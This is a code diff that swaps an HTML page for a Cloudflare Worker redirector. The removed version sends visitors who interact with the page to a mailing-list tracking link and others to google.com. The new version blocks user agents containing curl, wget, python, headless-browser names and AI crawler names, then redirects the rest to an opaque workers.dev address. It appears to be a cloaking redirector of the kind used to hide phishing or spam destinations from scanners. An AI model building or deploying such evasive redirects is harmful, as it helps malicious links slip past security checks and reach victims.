@@ -1,52 +1,78 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Insight</title>
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const isHuman = () => {
-        return new Promise((resolve) => {
-          let interacted = false; 
+// Configuration
+const redirectUrl = "https://707e3565.45dea72c27a70fa75e4d6281.workers.dev"; // URL to redirect to
+const rateLimit = 5; // Max requests per IP per hour
 
-          const events = ["mousemove", "keydown", "click", "scroll", "focus"];
-          const interactionListener = () => {
-            interacted = true;
-            resolve(true);
-            events.forEach((event) => window.removeEventListener(event, interactionListener));
-          };
+// Bot Detection Logic
+const botKeywords = [
+    'bot', 'crawl', 'spider', 'slurp', 'search', 'curl', 'wget', 'python', 'php',
+    'headless', 'chrome-headless', 'phantomjs', 'selenium', 'playwright', 'puppeteer',
+    'chatgpt', 'openai', 'gpt-3', 'gpt-4', 'ai', 'machine learning'
+];
 
-          events.forEach((event) => window.addEventListener(event, interactionListener));
-
-          // Fallback to check page visibility
-          const checkVisibility = () => {
-            if (document.visibilityState === "visible") {
-              resolve(true);
-            }
-          };
-          document.addEventListener("visibilitychange", checkVisibility);
-
-          // Default timeout for no interaction
-          setTimeout(() => {
-            if (!interacted) resolve(false);
-          }, 10000); // 10 seconds
-        });
-      };
-
-      isHuman().then((human) => {
-        if (human) {
-          // Redirect human users to the main page
-          window.location.href = "https://semi-zcmp.maillist-manage.com/click/1134d1b69885462df/1134d1b6988545f27";
-        } else {
-          // Redirect bots or non-interactive visitors to another URL
-          window.location.href = "https://google.com";
+function isBot(userAgent) {
+    const userAgentLower = userAgent.toLowerCase();
+    
+    // Check for common bot indicators in the user-agent
+    for (let keyword of botKeywords) {
+        if (userAgentLower.includes(keyword)) {
+            return true;
         }
-      });
-    });
-  </script>
-</head>
-<body>
-  <h1>Loading...</h1>
-</body>
-</html>
+    }
+
+    // Additional bot checks for suspicious patterns or very short user-agent strings
+    if (userAgent.length < 10) {
+        return true;
+    }
+
+    return false;
+}
+
+// Rate Limiting Logic
+let rateLimitData = {}; // Store rate limits in memory (in a production setup, use KV Storage)
+
+async function isRateLimited(ip) {
+    const currentTime = Math.floor(Date.now() / 1000); // Get current time in seconds
+    const hourAgo = currentTime - 3600;
+
+    if (rateLimitData[ip]) {
+        // Remove any outdated requests
+        rateLimitData[ip] = rateLimitData[ip].filter(timestamp => timestamp > hourAgo);
+
+        // Check if the user exceeded the rate limit
+        if (rateLimitData[ip].length >= rateLimit) {
+            return true; // Exceeded rate limit
+        }
+
+        // Add the current timestamp to the list of requests for this IP
+        rateLimitData[ip].push(currentTime);
+    } else {
+        rateLimitData[ip] = [currentTime]; // First request for this IP
+    }
+
+    return false; // Not rate limited
+}
+
+// Handle the request
+async function handleRequest(event) {
+    const request = event.request;
+    const url = new URL(request.url);
+    const ip = request.headers.get('CF-Connecting-IP'); // Cloudflare gives the real IP address
+    const userAgent = request.headers.get('User-Agent') || '';
+    const referrer = request.headers.get('Referer') || '';
+
+    // Check if the user is a bot or rate-limited
+    if (isBot(userAgent) || await isRateLimited(ip)) {
+        return new Response('Access denied.', { status: 403 });
+    }
+
+    // Log the redirection request (in a real app, you could use logging services)
+    console.log(`Redirecting IP: ${ip}, User-Agent: ${userAgent}, Referrer: ${referrer}`);
+
+    // Perform the redirect
+    return Response.redirect(redirectUrl, 302);
+}
+
+// Cloudflare Worker Event Listener
+addEventListener('fetch', event => {
+    event.respondWith(handleRequest(event));
+});
